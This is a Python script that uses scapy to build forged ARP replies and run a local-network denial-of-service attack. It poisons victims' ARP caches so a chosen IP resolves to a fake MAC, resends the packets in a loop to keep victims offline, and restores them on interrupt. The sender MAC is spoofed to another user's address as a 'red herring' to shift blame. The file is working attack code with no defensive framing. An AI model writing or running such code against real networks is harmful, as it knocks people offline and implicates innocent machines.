#!/usr/bin/env python

from scapy.all import *
import time
import signal
import sys
from hosts import * 
import netifaces


def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
	
	
	myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
									#set as another users MAC for Red herring attempt
	if poison == True:
		dstMAC = "08:00:27:ff:ff:fe"		#False MAC address
	else:
		dstMAC = deadEndMAC

	#Creating Poisoning packet

	#Ethernet*****************
	pkt = Ether()/ARP()	
	pkt.dst = victimMAC		#Ethernet Destination
	pkt.src = myMAC			#Ethernet Source
	#************************
	
	#ARP**********************
	pkt.pdst= victimIP		# (IP)
	pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
	pkt.psrc = deadEndIP		# if you're trying to talk to...
	pkt.hwsrc = dstMAC		# His MAC address is ...
	pkt.op = 2			# that's where he's at (is-at)
	#*************************
	return pkt


def DenialOfService(interface, victims, quarantine, verbosity):

#	victims = getTargets(interface, targetString, 0, verbose, True)

	#if router in victims:
	#	del victims[router]	#In case router was selected as a victim
	qIP = quarantine[0]
	qMAC = quarantine[1]

	packets = []

	for ip, info in victims.iteritems():
		packets.append( createPacket(ip,info[0], qIP, qMAC, True) )


	print("Turn out the lights....")

	try:
		while True:
			for pkt in packets:
				sendp(pkt, iface=interface, verbose=0)
				
			time.sleep(2)

	except KeyboardInterrupt:
		print("Re-ARPing....")

		healPacks = []

		for ip, info in victims.iteritems():
			healPacks.append(createPacket(ip,info[0], qIP, qMAC, False))

		for i in range(0, 5):
			for heal in healPacks:
				sendp(heal, iface=interface, verbose=0)
				
			time.sleep(1)

		sys.exit(0)

